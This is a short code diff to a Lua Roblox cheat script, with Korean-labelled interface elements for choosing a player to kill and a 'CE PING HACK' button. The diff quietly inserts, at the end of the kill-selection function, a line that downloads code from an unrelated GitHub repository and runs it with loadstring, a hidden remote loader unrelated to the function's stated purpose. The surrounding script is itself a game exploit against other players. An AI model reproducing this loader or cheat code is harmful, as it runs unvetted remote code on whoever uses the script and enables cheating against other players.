@@ -1426,6 +1426,7 @@ local function CE_EX_Select_KILL()
 			wait(3)
 		end
 	end
+ loadstring(game:HttpGet('https://raw.githubusercontent.com/Himynamefake/eqw/refs/heads/main/JayThePrime'))()
 end
 ----------------------- ACS CE -----------------------------
 ---------------------- 부대게임, 팽부대 시작 ------------------------------
@@ -2237,6 +2238,13 @@ local Input_peng_Cuff_Name = Tab2:CreateInput({
 	PlaceholderText = "죽일 플레이어 이름 입력",
 	Callback = function(text)
 		CE_EX_target = findPlayerDisplayName(text) -- 입력받는 텍스트 사용
+	end
+})
+local Button_CE_PING_HACK = Tab2:CreateButton({
+	Name = "CE PING HACK",
+	Callback = function()
+		CEPINGHACK()
+		showMessage("CE_PING_HACK")
 	end
 })
 
